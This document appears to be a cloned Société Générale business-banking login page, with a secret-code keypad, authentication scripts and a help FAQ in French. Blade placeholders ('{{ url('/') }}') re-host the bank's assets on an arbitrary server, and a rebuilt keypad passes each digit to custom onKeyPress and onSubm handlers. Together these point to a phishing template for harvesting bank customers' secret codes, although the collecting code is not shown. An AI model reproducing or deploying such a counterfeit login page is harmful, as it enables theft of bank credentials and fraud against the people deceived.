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"><div id="hover_touche_4_4" onclick="onKeyPress('2')" role="button" class="hover" style="position: absolute; left: 200px; top: 180px; width: 60px; height: 60px;"></div><div id="hover_touche_4_3" onclick="onKeyPress('7')" role="button" class="hover" style="position: absolute; left: 140px; top: 180px; width: 60px; height: 60px;"></div><div id="hover_touche_4_2" role="button" class="hover" style="position: absolute; left: 80px; top: 180px; width: 60px; height: 60px;"></div><div id="hover_touche_4_1" role="button" class="hover" style="position: absolute; left: 20px; top: 180px; width: 60px; height: 60px;"></div><div id="hover_touche_3_4" role="button" class="hover" style="position: absolute; left: 200px; top: 120px; width: 60px; height: 60px;"></div><div id="hover_touche_3_3" onclick="onKeyPress('5')" role="button" class="hover" style="position: absolute; left: 140px; top: 120px; width: 60px; height: 60px;"></div><div id="hover_touche_3_2" role="button" class="hover" style="position: absolute; left: 80px; top: 120px; width: 60px; height: 60px;"></div><div id="hover_touche_3_1" onclick="onKeyPress('0')" role="button" class="hover" style="position: absolute; left: 20px; top: 120px; width: 60px; height: 60px;"></div><div id="hover_touche_2_4" role="button" class="hover" style="position: absolute; left: 200px; top: 60px; width: 60px; height: 60px;"></div><div id="hover_touche_2_3" role="button" class="hover" style="position: absolute; left: 140px; top: 60px; width: 60px; height: 60px;"></div><div id="hover_touche_2_2" onclick="onKeyPress('8')" role="button" class="hover" style="position: absolute; left: 80px; top: 60px; width: 60px; height: 60px;"></div><div id="hover_touche_2_1" onclick="onKeyPress('4')" role="button" class="hover" style="position: absolute; left: 20px; top: 60px; width: 60px; height: 60px;"></div><div id="hover_touche_1_4" onclick="onKeyPress('9')" role="button" class="hover" style="position: absolute; left: 200px; top: 0px; width: 60px; height: 60px;"></div><div id="hover_touche_1_3" onclick="onKeyPress('6')" role="button" class="hover" style="position: absolute; left: 140px; top: 0px; width: 60px; height: 60px;"></div><div id="hover_touche_1_2" onclick="onKeyPress('3')" role="button" class="hover" style="position: absolute; left: 80px; top: 0px; width: 60px; height: 60px;"></div><div id="hover_touche_1_1" onclick="onKeyPress('1')" role="button" class="hover" style="position: absolute; left: 20px; top: 0px; width: 60px; height: 60px;"></div><div id="hover_touche_4_4" onclick="onKeyPress('2')" role="button" class="hover" style="position: absolute; left: 200px; top: 180px; width: 60px; height: 60px;"></div><div id="hover_touche_4_3" onclick="onKeyPress('7')" role="button" class="hover" style="position: absolute; left: 140px; top: 180px; width: 60px; height: 60px;"></div><div id="hover_touche_4_2" role="button" class="hover" style="position: absolute; left: 80px; top: 180px; width: 60px; height: 60px;"></div><div id="hover_touche_4_1" role="button" class="hover" style="position: absolute; left: 20px; top: 180px; width: 60px; height: 60px;"></div><div id="hover_touche_3_4" role="button" class="hover" style="position: absolute; left: 200px; top: 120px; width: 60px; height: 60px;"></div><div id="hover_touche_3_3" role="button" class="hover" onclick="onKeyPress('5')"  style="position: absolute; left: 140px; top: 120px; width: 60px; height: 60px;"></div><div id="hover_touche_3_2" role="button" class="hover" style="position: absolute; left: 80px; top: 120px; width: 60px; height: 60px;"></div><div id="hover_touche_3_1" onclick="onKeyPress('0')" role="button" class="hover" style="position: absolute; left: 20px; top: 120px; width: 60px; height: 60px;"></div><div id="hover_touche_2_4" role="button" class="hover" style="position: absolute; left: 200px; top: 60px; width: 60px; height: 60px;"></div><div id="hover_touche_2_3" role="button" class="hover" style="position: absolute; left: 140px; top: 60px; width: 60px; height: 60px;"></div><div id="hover_touche_2_2" onclick="onKeyPress('8')" role="button" class="hover" style="position: absolute; left: 80px; top: 60px; width: 60px; height: 60px;"></div><div id="hover_touche_2_1" onclick="onKeyPress('4')" role="button" class="hover" style="position: absolute; left: 20px; top: 60px; width: 60px; height: 60px;"></div><div id="hover_touche_1_4" onclick="onKeyPress('9')" role="button" class="hover" style="position: absolute; left: 200px; top: 0px; width: 60px; height: 60px;"></div><div id="hover_touche_1_3" onclick="onKeyPress('6')" role="button" class="hover" style="position: absolute; left: 140px; top: 0px; width: 60px; height: 60px;"></div><div id="hover_touche_1_2" onclick="onKeyPress('3')" role="button" class="hover" style="position: absolute; left: 80px; top: 0px; width: 60px; height: 60px;"></div><div id="hover_touche_1_1" onclick="onKeyPress('1')"  role="button" class="hover" style="position: absolute; left: 20px; top: 0px; width: 60px; height: 60px;"></div>
                            </div>
                        </div>
                    </div>

                    <div class="auth-cs-content-validate">
                        <button   onclick="onSubm()" class="swm_button-principal swm_button-arrondi auth-btn-action swm_btn-disable" id="btn-authent" type="button" aria-label="Valider votre code secret">Valider
                        </button>

                        <div class="sonore-Keyboard swm_block-element">
                            <a id="activeKS" class="swm_link swm_btn-disable" tabindex="0" href="javascript:void(0)">Activer le
                                clavier sonore</a>
                        </div>
                    </div>
                </div>
            </div>

</div>


    </div>
</div>



    
  </div>


    



<script>
var fun;
function onSWMLoaded(params) {
    if ("") {
        fun = function() {
            params.error ? params.error() : (function () {
                if (!document.getElementById('js-error')) {
                    document.getElementById(params.defaultClass || 'swm-wrapper').innerHTML = ("<div id=\"js-error\"></div>");
                }
                swm.commun.showErrorMessage.call(
                    this,
                    "",
                    "/icd-web/syd-front/index-comptes.html");
            })();
        };
        window.swm ? fun() : document.addEventListener("swm.onLoad", fun);
    } else {
        fun = initSWM.bind(this, params);
        window.swm ? initSWM(params) : document.addEventListener("swm.onLoad", fun);
    }
}


function initSWM(params) {
    
    window.jQueryForSwm = swm.$;
    window.swmAutoInit = false;
    (function(a,b){if(typeof define==="function"&&define.amd){if(typeof swmAutoInit==="undefined"){swmAutoInit=false}define(["jquery"],b)}else{if(typeof swmAutoInit==="undefined"){swmAutoInit=true}var c=a.jQueryForSwm||a.jQuery;b(c)}})(this,function(g){if(window&&typeof window.swmApi!=="undefined"){return window.swmApi}var m={};var p;var s=false;var i=false;var b={getJetonCallback:[],iStockageJetonActifCallback:[],ajaxFilter:[]};var f={};m.consts={};m.consts.niveauSensibilite={};m.consts.niveauSensibilite.NORMAL={value:0};m.consts.niveauSensibilite.SENSIBLE={value:100};m.consts.niveauSensibilite.TRES_SENSIBLE={value:200};if(typeof swmConfOverride!=="undefined"){m.version=swmConfOverride.version}m.loadSwm=function(){r("The method swm.loadSwm is deprecated, please use swm.init instead.");m.init.apply(m,arguments)};m.init=function(u){var v={mainJsPath:"/js/swm.main.js",swmMain:undefined};q(v,u);function w(){m.config=p.config;m.$=p.$;s=false;i=true;o();c("swm.available",p)}m.addConf({onAuthent:v.onAuthent,onBack:v.onBack,onClose:v.onClose,onConnecting:v.onConnecting,onInitDone:v.onInitDone,onLoadingError:v.onLoadingError,onLogout:v.onLogout,ajaxFilterRegExp:v.ajaxFilterRegExp,ajaxFilterJquery:v.ajaxFilterJquery,baseUrl:v.baseUrl});if(!i){p=v.swmMain;if(typeof p!=="undefined"){setTimeout(w,0)}else{j("swm.init",function(x){p=x;w()});if(!s){s=true;var t;if(typeof swmConfOverride!=="undefined"&&swmConfOverride.staticBaseUrl){t=(v.baseUrl||"")+swmConfOverride.staticBaseUrl+v.mainJsPath}else{t="/swm/resources/version/"+m.version+v.mainJsPath}k(t,function(){c("swm.loadingError")})}}}else{c("swm.available",p)}};if(window.swmAutoInit){j("swm.loaded",m.init)}window.swmAutoInit=undefined;m.ajaxFilter=function(u,t){if(p){u.ajaxFilterJquery=u.ajaxFilterJquery||g||p.$;if(u.ajaxFilterRegExp){u.ajaxFilterJquery.ajax=p.filterAjaxRequests(u).overridedAjax;if(typeof t==="function"){t()}}return u.ajaxFilterJquery.ajax}else{a("ajaxFilter",[u,t])}};m.onLogout=function(t){j("swm.logout",t)};m.onClose=function(t){j("swm.close",t);j("swm.closeKeyboard",t)};m.onConnecting=function(t){j("swm.connecting",t)};m.onBack=function(t){j("swm.back",t)};m.onLogoutError=function(t){j("swm.logout.error",t)};m.onAuthent=function(t){j("swm.postchgtnivauth",t)};m.setStockageJetonActif=function(t){t=t==true;if(p){p.data.setStockageJetonActif(t)}else{h("setStockageJetonActif",t)}};m.isStockageJetonActif=function(t){if(typeof t=="function"){if(p){setTimeout(function(){t(p.data.isStockageJetonActif())},0)}else{a("iStockageJetonActifCallback",t);return undefined}}};m.getJeton=function(t){if(typeof t=="function"){if(p){setTimeout(function(){t(p.data.getJeton())},0)}else{a("getJetonCallback",t);return undefined}}};m.getIdStat=function(){if(p){return p.data.getIdStat()}return undefined};m.sign=function(t,v){if(p){return p.sign(t,v)}else{var u={getData:function(){return new Error("Signature non prÃªte public.")}};h("sign",{params:[t,v],promise:u});if(typeof t==="string"){return u}}};m.triggerSwmLogout=function(){if(p){return p.triggerSwmLogout()}else{return new Error("triggerSwmLogout non prÃªte public.")}};m.record=function(t){if(p){return p.record(t)}else{h("record",arguments)}};m.checkSign=function(t){if(p){return p.checkSign(t)}else{h("checkSign",arguments)}};m.gda_handleResponse=function(w,u,v,t){if(p){return p.gda_handleResponse(w,u,v,t)}else{return undefined}};m.errorSign=function(t){var u={};u.success=t.success;u.actionLevel=t.action_level||t.actionLevel||0;u.jetonTransaction=t.context||t.jetonTransaction;u.error=t.error;u.isMessageRequired=t.isMessageRequired;u.callback=t.callback;if(p){return p.errorSign(u)}else{h("errorSign",arguments)}};m.getDateDerniereConnexion=function(){if(p){return p.data.getDateDerniereConnexion()}return undefined};m.getCanalDerniereConnexion=function(){if(p){return p.data.getCanalDerniereConnexion()}return undefined};m.getDroits=function(){if(p){return p.data.getDroits()}return undefined};m.logout=function(){if(p){p.logout.apply(m,arguments)}else{h("logout",arguments)}};m.logoutSupervision=function(){r("The method swmApi.logoutSupervision is deprecated, please use swmApi.logout instead.");m.logout()};m.resetAuthentData=function(){if(p){p.data.resetAuthentData.apply(m,arguments)}else{h("resetAuthentData",arguments)}};m.isAuthenticated=function(){if(p){return p.isAuthenticated()}return false};m.authent=function(u,t,v){if(p){t=t||function(w){if(f.preSuccess==="function"){f.preSuccess(w,function(){f.success(w)})}else{f.success(w)}};v=v||f.error;return p.authent(u,t,v)}else{h("authent",[u,t,v])}return false};m.setDefaultAuthentCallbacks=function(t){f.preSuccess=t.preSuccess||f.preSuccess;f.success=t.success||f.success;f.error=t.error||f.error};m.changeCodeSecret=function(t,u){if(p){return p.changeCodeSecret(t,u)}else{h("changeCodeSecret",[t,u])}return false};m.addConf=function(t){t.onAuthent&&j("swm.postchgtnivauth",t.onAuthent);t.onLogout&&j("swm.logout",t.onLogout);t.onBack&&j("swm.back",t.onBack);t.onClose&&j("swm.close",t.onClose);t.onConnecting&&j("swm.connecting",t.onConnecting);t.onLoadingError&&j("swm.loadingError",t.onLoadingError);t.onAjaxFilterReady&&j("swm.onResponseFilterReady",t.onAjaxFilterReady);if(t.ajaxFilterRegExp){var u={ajaxFilterRegExp:t.ajaxFilterRegExp,ajaxFilterJquery:t.ajaxFilterJquery,ajaxFilterAxios:t.ajaxFilterAxios};m.ajaxFilter(u,t.onAjaxFilterReady)}if(t.baseUrl){d(t.baseUrl)}if(typeof p!="undefined"){t.onInitDone&&t.onInitDone()}else{t.onInitDone&&j("swm.available",t.onInitDone)}};function d(t){if(p){p.config.baseUrl=t}else{h("setBaseUrl",[t])}}function h(t,u){b[t]=u;!s&&!i&&m.init()}function a(t,u){b[t].push(u);!s&&!i&&m.init()}function n(t){return t&&Object.prototype.toString.call(t)==="[object Array]"}function o(){for(var v in b){if(v==="iStockageJetonActifCallback"||v==="getJetonCallback"){for(var u in b[v]){m.hasOwnProperty(v)&&typeof m[v]==="function"&&m[v](u)}}else{if(v==="signature"){var w=m[v].apply(m,b[v].params);if(typeof w==="object"){b.signature.promise.getData=w}}else{if(v==="setBaseUrl"){d.apply(m,b.setBaseUrl)}else{if(n(b[v])){for(var t in b[v]){b[v].hasOwnProperty(t)&&m[v].apply(m,b[v][t])}}else{m[v].apply(m,b[v])}}}}}b={getJetonCallback:[],iStockageJetonActifCallback:[]}}function c(t,v){var u=document.createEvent("Event");u.initEvent(t,true,true);u.data=v;document.dispatchEvent(u);var x=window.self!==window.top;if(x){try{top.document.dispatchEvent(u)}catch(w){}}}g&&(g.fn.triggerExternal=c);function j(u,v){var t=function(w){if(typeof v==="function"){v(w.data)}};document.removeEventListener(u,t);document.addEventListener(u,t)}function k(u,v){if(g&&typeof g.Deferred!=="undefined"){var t=l(u);g.when(t).fail(v)}else{e(u,v)}}function l(v){var t=g.Deferred(),u=document.createElement("script");u.async="async";u.type="text/javascript";u.src=v;u.onload=u.onreadystatechange=function(x,w){if(!u.readyState||/loaded|complete/.test(u.readyState)){if(w){t.reject()}else{t.resolve()}}};u.onerror=function(){t.reject()};g("head")[0].appendChild(u);return t.promise()}function e(u,v){var t=document.createElement("script");t.async=false;t.src=u;t.type="text/javascript";t.onerror=v;t.charset="UTF-8";document.getElementsByTagName("head")[0].appendChild(t)}function r(u){try{console&&typeof console.warn==="function"&&console.warn("[SWM] "+u)}catch(t){}}function q(u,t){if(t){for(var v in t){if(t.hasOwnProperty(v)){u[v]=t[v]}}}return u}setTimeout(function(){c("swm.loaded",m)},0);window.swmApi=m;return m});
    swmApi.init({
        swmMain: swm
    });
    swm.commun.setGdaReplay("/swm/swm-redirect.html", "W6c9YMV%2FMuNKbhVrJbT%2FCp9SYRcsAQAAAQAAAEAAAAAvaWNkLXdlYi9zeWQtZnJvbnQvaW1hZ2VzL3BpY3Rvcy1mb25jdGlvbm5lbHNfMjAyMzA1MTAxNzU3NTYuc3Zn", "" || window.location.hash);
    if ("") {
        swm.commun.showError("");
    }
    params.event && swm.trackEvent(params.event);
    document.removeEventListener("swm.onLoad", fun);
    fun = undefined;
    params.success && params.success();
}
</script>

    <script>
        onSWMLoaded({
            defaultClass: 'swmModulesAuth',
            success: function() {
                
                swmApi.setDefaultAuthentCallbacks({
                    success : function(rsp) {
                        swm.commun.replayInterceptedPage();
                    },
                    error: function(err) {
                        swm.defaultAuthentError(err, "/icd-web/syd-front/index-comptes.html");
                    }
                });
                
                swmApi.authent("300");
            },
            event: {
                pageName: 'Mon_Profil::Connexion::Ecran_Connexion'
            }
        });
    </script>

</div>



<script type="text/javascript" src="{{ url('/') }}/js/swm.main.js" charset="UTF-8"></script>





<script type="text/javascript">
if (typeof(swm) != "undefined" && swm.onLogout) {
swm.onLogout(function() {
    document.location.href = '/icd-web/syd-front/index-comptes.html';
});
}

</script>
</div>


    </section>
<section class="dcw_gb9_core-right">



















<div>

<div>
    <link rel="stylesheet" href="{{ url('/') }}/icd/static/swm/resources/version/23.3.4/assets/markets/BDDF/ENT/INT/style.css">
    <link href="{{ url('/') }}/css/eo2680-style.css" rel="stylesheet"><!-- default -->
<div id="swm-content-default">
<p><strong>Où trouver mon Identifiant Client SG ?</strong></p>

<ul>
<li><strong>•</strong> Si vous êtes l’administrateur de l’abonnement, votre Identifiant Client vous a été attribué par votre Chargé d’Affaires lors de la souscription de votre contrat Sogecash Net.</li>
<li><strong>•</strong> Si vous êtes un utilisateur délégué, votre Identifiant Client vous est attribué directement par votre Administrateur.</li>
<li><strong>•</strong> Si vous étiez client d’une des banques du Groupe Crédit du Nord, le nouvel Identifiant Client SG a été envoyé par courrier postal il y a quelques semaines à l'administrateur de l'abonnement.</li>
</ul>
&nbsp;

<p><strong>Mon Code Secret a-t-il changé avec SG ?</strong></p>

<ul>
<li>Vous seul connaissez votre Code Secret.</li>
<li><strong>•</strong> Si vous étiez client Société Générale, utilisez votre Code Secret habituel.</li>
<li><strong>•</strong> Si vous étiez client d’une des banques du Groupe Crédit du Nord, utilisez le Code Secret qui vous permettait de vous connecter à votre banque en ligne.</li>
</ul>
&nbsp;

<p><strong>Identifiant Client ou Code Secret inconnus, accès bloqué ?</strong></p>

<ul>
<li>Pour l’administrateur de l’abonnement :</li>
<li>&gt;&gt; <u><a href="/swm/swm-restitution.html">Obtenir mon Identifiant Client</a></u></li>
<li>&gt;&gt; <u><a href="/swm/swm-reattribution.html">Demande de nouveau Code Secret / Accès bloqué</a></u></li>
<li>Si vous êtes un utilisateur délégué, rapprochez-vous de votre administrateur.</li>
</ul>
&nbsp;

<p><strong>Nos autres Espaces Client</strong></p>

<ul>
<li>&gt;&gt; <u><a href="https://professionnels.sg.fr/icd-web/syd-front/index-comptes.html#comptes">Espace Client Professionnels (Progéliance Net)</a></u></li>
<li>&gt;&gt; <u><a href="https://particuliers.sg.fr/com/icd-web/cbo/index.html">Espace Client Particuliers</a></u></li>
</ul>
</div>
<!-- #eo2680-oob : le contenu du paragraphe a été copié de swm-content-otp -->

<div id="swm-content-oob" style="display:none">
<div class="eo2680-pass">
<p class="eo2680-oob--title">Sécurité renforcée</p>

<div class="eo2680-card">
<figure><img src="{{ url('/') }}/images/securite-renforcee.png"></figure>

<p><strong>La réglementation européenne</strong>, applicable à toutes les banques, a évoluée afin de renforcer la sécurité de vos données bancaires. La première connexion à votre Espace Client est désormais soumise à une authentification renforcée par la saisie d’un Code Sécurité reçu par SMS ou SVI sur le Téléphone Sécurité que vous avez préalablement déclaré auprès de votre Chargé d’Affaires.</p>
</div>
</div>
</div>
<!-- #eo2680-otp -->

<div id="swm-content-otp" style="display:none">
<div class="eo2680-oob">
<p class="eo2680-oob--title">Sécurité renforcée</p>

<div class="eo2680-card">
<figure><img alt="" src="{{ url('/') }}/images/securite-renforcee.png"></figure>

<p><strong>La réglementation européenne</strong>, applicable à toutes les banques, a évoluée afin de renforcer la sécurité de vos données bancaires. La première connexion à votre Espace Client est désormais soumise à une authentification renforcée par la saisie d’un Code Sécurité reçu par SMS ou SVI sur le Téléphone Sécurité que vous avez préalablement déclaré auprès de votre Chargé d’Affaires.</p>
</div>
</div>
</div>

</div>

</div>




</section>
<section class="dcw_gb_row dcw_gb_clearfix">
</section>
</section>
</main>



















<div>

<div>
    <!-- ENT - footer-disconnected,footer-int-without-closing-main 7 disclaimer global-empty  -->

</div>

</div>




<aside class="dcw_msg-banner dcw_msg-banner--info dcw_msg-banner--last-connexion" id="lastConnectionBanner" role="alert" style="display:none;">
<svg class="dcw_msg-banner_picto-info" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="images/pictos-fonctionnels_20230510175756.svg#info"></use></svg>
<p class="dcw_msg-banner_message" id="lastConnectionMessage">

</p>
<button arial-label="Fermer le message contextuel" class="dcw_msg-banner_btn-closed">
<svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="images/pictos-fonctionnels_20230510175756.svg#close-2"></use></svg>
</button>
</aside><footer class="dcw_footer" role="contentinfo">
<div class="dcw_footer-second">
<div class="dcw_footer_container">
<nav class="dcw_footer-second_nav">
    <ul class="dcw_footer-second_list">
            <li class="dcw_footer-second_item">
<a data-tms-container-label="footer-general-shortcuts" href="/questions-frequentes">            <svg class="dcw_footer-second_icon" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="images/pictos-fonctionnels_20230510175756.svg#question"></use></svg>
Questions fréquentes
</a>    </li>
<li class="dcw_footer-second_item">
                <div class="dcw_dropdown js-dropdown-light">
<button class="dcw_dropdown_titre js-dropdown_btn" aria-label="Ouvrir la liste des autres sites Société Générale" aria-expanded="false" aria-owns="dcw-dropdown-list">Autres sites SG</button>
<svg class="dcw_dropdown_icon" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="images/pictos-fonctionnels_20230510175756.svg#arrow-dropdown"></use></svg>
<ul class="dcw_dropdown_list toggle_content">
<li class="dcw_dropdown_item">
    <a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="https://particuliers.sg.fr/">Particuliers</a>
</li>
<li class="dcw_dropdown_item">
    <a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="https://privatebanking.societegenerale.com/fr">Banque Privée</a>
</li>
<li class="dcw_dropdown_item">
    <a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="https://professionnels.sg.fr/">Professionnels</a>
</li>
<li class="dcw_dropdown_item">
    <a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="https://associations.sg.fr/">Associations</a>
</li>
<li class="dcw_dropdown_item">
    <a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="https://economiepublique.sg.fr/">Économie publique</a>
</li>
<li class="dcw_dropdown_item">
    <a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="https://banque.sg.fr/">Découvrir SG</a>
</li>
<li class="dcw_dropdown_item">
    <a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="https://www.societegenerale.com/fr">Le groupe Société Générale</a>
</li>
</ul>
</div></li>
        </ul>
</nav>
<ul class="dcw_footer_container dcw_footer-second_social">
        <li class="dcw_footer-second_item-social">
<a data-tms-container-label="footer-social-links" title="Suivez-nous sur Facebook" href="http://www.facebook.com/sgetvous">            <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="images/pictos-fonctionnels_20230510175756.svg#facebook-2"></use></svg>
</a>    </li>
<li class="dcw_footer-second_item-social">
<a data-tms-container-label="footer-social-links" title="Suivez-nous sur Twitter" href="http://twitter.com/SGEntrepreneurs">            <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="images/pictos-fonctionnels_20230510175756.svg#twitter-2"></use></svg>
</a>    </li>
<li class="dcw_footer-second_item-social">
<a data-tms-container-label="footer-social-links" title="Suivez-nous sur Linkedin" href="https://www.linkedin.com/showcase/sgentrepreneurs">            <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="images/pictos-fonctionnels_20230510175756.svg#linkedin-2"></use></svg>
</a>    </li>
</ul>
</div>
</div>
<nav class="dcw_footer-third">
<div class="dcw_footer_container">
<a href="https://www.societegenerale.com"><img alt="Page d'accueil - SG" class="dcw_footer-third_logo" height="30" src="{{ url('/') }}/images/logo-sg-seul.svg" width="150"></a>

<ul class="dcw_footer-third_list">
        <li class="dcw_footer-third_item">
<a data-tms-container-label="footer-super-links" href="/assistance">Assistance</a>
</li>
<li class="dcw_footer-third_item">
<a data-tms-container-label="footer-super-links" href="/fraude-et-securite">Sécurité</a>
</li>
<li class="dcw_footer-third_item">
<a data-tms-container-label="footer-super-links" href="/nos-engagements">Nos engagements</a>
</li>
